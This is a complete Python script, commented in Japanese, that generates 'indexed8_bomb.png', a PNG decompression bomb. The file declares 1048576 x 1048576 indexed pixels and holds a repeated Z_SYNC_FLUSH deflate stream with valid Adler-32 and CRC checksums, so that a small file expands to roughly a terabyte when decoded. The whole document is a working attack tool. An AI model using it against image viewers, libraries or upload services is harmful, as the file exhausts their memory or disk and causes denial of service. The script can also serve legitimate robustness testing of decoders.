import zlib
import struct
import time
import os

# ==========================================
# ▼▼▼ 設定エリア ▼▼▼
# ==========================================

IMAGE_WIDTH  = 1048576
IMAGE_HEIGHT = 1048576
OUTPUT_FILENAME = "indexed8_bomb.png"

# パレットに登録する色（最大256色）
# Indexed-8 では、画像データはRGBではなく「この配列の何番目の色か」(0〜255)で記録されます
PATTERN_COLORS =[
    (255, 0, 0),     # 0: 赤
    (0, 255, 0),     # 1: 緑
    (0, 0, 255),     # 2: 青
    (255, 255, 0),   # 3: 黄
    (0, 255, 255),   # 4: シアン
    (255, 0, 255),   # 5: マゼンタ
    (255, 255, 255), # 6: 白
    (0, 0, 0)        # 7: 黒
]

# ==========================================
# ▲▲▲ 設定エリアここまで ▲▲▲
# ==========================================


def combine_adler(adler1, len1, adler2, len2):
    BASE = 65521
    a1, b1 = adler1 & 0xffff, adler1 >> 16
    a2, b2 = adler2 & 0xffff, adler2 >> 16
    a_new = (a1 + a2 - 1) % BASE
    rem = len2 % BASE
    b_new = (b1 + b2 + a1 * rem - rem) % BASE
    return ((b_new << 16) | a_new)

def repeat_adler(adler_base, length, times):
    result_adler = 1
    result_len = 0
    cur_adler = adler_base
    cur_len = length
    while times > 0:
        if times % 2 == 1:
            result_adler = combine_adler(result_adler, result_len, cur_adler, cur_len)
            result_len += cur_len
        cur_adler = combine_adler(cur_adler, cur_len, cur_adler, cur_len)
        cur_len *= 2
        times //= 2
    return result_adler

class IDATWriter:
    def __init__(self, f, max_chunk_size=100*1024*1024):
        self.f = f
        self.max_chunk_size = max_chunk_size
        self.buf = bytearray()
        
    def write(self, data):
        self.buf.extend(data)
        while len(self.buf) >= self.max_chunk_size:
            chunk = self.buf[:self.max_chunk_size]
            self._write_chunk(chunk)
            self.buf = self.buf[self.max_chunk_size:]
            
    def flush(self):
        if self.buf:
            self._write_chunk(self.buf)
            self.buf = bytearray()
            
    def _write_chunk(self, chunk):
        self.f.write(struct.pack('!I', len(chunk)))
        self.f.write(b'IDAT')
        self.f.write(chunk)
        self.f.write(struct.pack('!I', zlib.crc32(chunk, zlib.crc32(b'IDAT'))))

def generate_indexed_png():
    if len(PATTERN_COLORS) > 256:
        raise ValueError("Indexed-8のパレットは最大256色までです")

    print(f"--- 究極PNGジェネレータ [Indexed-8 モード] ---")
    print(f"サイズ: {IMAGE_WIDTH} x {IMAGE_HEIGHT} px")
    # Indexed-8 なので 1px = 1byte
    raw_size = (IMAGE_WIDTH * 1 + 1) * IMAGE_HEIGHT
    print(f"非圧縮時の推定容量: {raw_size / (1024**3):.2f} GB")

    print(f"[{time.strftime('%X')}] パレット(PLTE)とインデックス配列を構築中...")
    
    # 1. パレット(PLTE)データの構築
    plte_data = bytearray()
    for r, g, b in PATTERN_COLORS:
        plte_data.extend([r, g, b])
        
    # 2. 画像データ（インデックス番号）の構築
    # RGBではなく「0, 1, 2, 3, 4, 5, 6, 7」という数値の羅列になります
    pattern_indices = list(range(len(PATTERN_COLORS)))
    repeats = IMAGE_WIDTH // len(pattern_indices)
    remainder = IMAGE_WIDTH % len(pattern_indices)
    
    row_indices = bytearray(pattern_indices * repeats + pattern_indices[:remainder])

    # 3. PNGの行データを定義（幅が1/3に劇的に小さくなります）
    row1 = bytearray([0]) + row_indices               # 1行目: フィルタ0(None) + インデックス
    row2 = bytearray([2]) + bytearray(IMAGE_WIDTH)    # 2行目以降: フィルタ2(Up) + 差分ゼロ

    print(f"[{time.strftime('%X')}] Adler32チェックサム計算中...")
    adler_row1 = zlib.adler32(row1)
    if IMAGE_HEIGHT > 1:
        adler_row2 = zlib.adler32(row2)
        total_adler_row2s = repeat_adler(adler_row2, len(row2), IMAGE_HEIGHT - 1)
        final_adler = combine_adler(adler_row1, len(row1), total_adler_row2s, len(row2) * (IMAGE_HEIGHT - 1))
    else:
        final_adler = adler_row1

    print(f"[{time.strftime('%X')}] Z_SYNC_FLUSH による増幅用バイナリの抽出中...")
    c = zlib.compressobj(level=9, wbits=-15)
    
    out1 = c.compress(row1) + c.flush(zlib.Z_SYNC_FLUSH)
    if IMAGE_HEIGHT > 1:
        out2 = c.compress(row2) + c.flush(zlib.Z_SYNC_FLUSH)
        if IMAGE_HEIGHT > 2:
            out3 = c.compress(row2) + c.flush(zlib.Z_SYNC_FLUSH)
        out_last = c.compress(row2) + c.flush()
    else:
        out1 = c.compress(row1) + c.flush()

    print(f"[{time.strftime('%X')}] ファイル '{OUTPUT_FILENAME}' に書き出し中...")
    with open(OUTPUT_FILENAME, 'wb') as f:
        f.write(b'\x89PNG\r\n\x1a\n')
        
        # IHDRチャンク: カラータイプを 2(Truecolor) から 3(Indexed-color) に変更！
        ihdr_data = struct.pack('!IIBBBBB', IMAGE_WIDTH, IMAGE_HEIGHT, 8, 3, 0, 0, 0)
        f.write(struct.pack('!I', len(ihdr_data)))
        f.write(b'IHDR')
        f.write(ihdr_data)
        f.write(struct.pack('!I', zlib.crc32(ihdr_data, zlib.crc32(b'IHDR'))))
        
        # PLTEチャンク (パレット情報) を必ずIHDRとIDATの間に挟む
        f.write(struct.pack('!I', len(plte_data)))
        f.write(b'PLTE')
        f.write(plte_data)
        f.write(struct.pack('!I', zlib.crc32(plte_data, zlib.crc32(b'PLTE'))))
        
        # IDATチャンク (画像データ部)
        idat = IDATWriter(f)
        idat.write(b'\x78\xDA') 
        
        if IMAGE_HEIGHT == 1:
            idat.write(out1)
        elif IMAGE_HEIGHT == 2:
            idat.write(out1)
            idat.write(out_last)
        else:
            idat.write(out1)
            idat.write(out2)
            
            repeats_out3 = IMAGE_HEIGHT - 3
            multiplier = max(1, min(100000, 10 * 1024 * 1024 // len(out3)))
            big_out3 = out3 * multiplier
            
            for _ in range(repeats_out3 // multiplier):
                idat.write(big_out3)
            for _ in range(repeats_out3 % multiplier):
                idat.write(out3)
                
            idat.write(out_last)
            
        idat.write(struct.pack('!I', final_adler))
        idat.flush()
        
        # IENDチャンク
        f.write(struct.pack('!I', 0))
        f.write(b'IEND')
        f.write(struct.pack('!I', zlib.crc32(b'IEND')))
        
    final_size_mb = os.path.getsize(OUTPUT_FILENAME) / (1024**2)
    print(f"[{time.strftime('%X')}] 完成！ 実際の出力ファイルサイズ: {final_size_mb:.2f} MB")

if __name__ == "__main__":
    generate_indexed_png()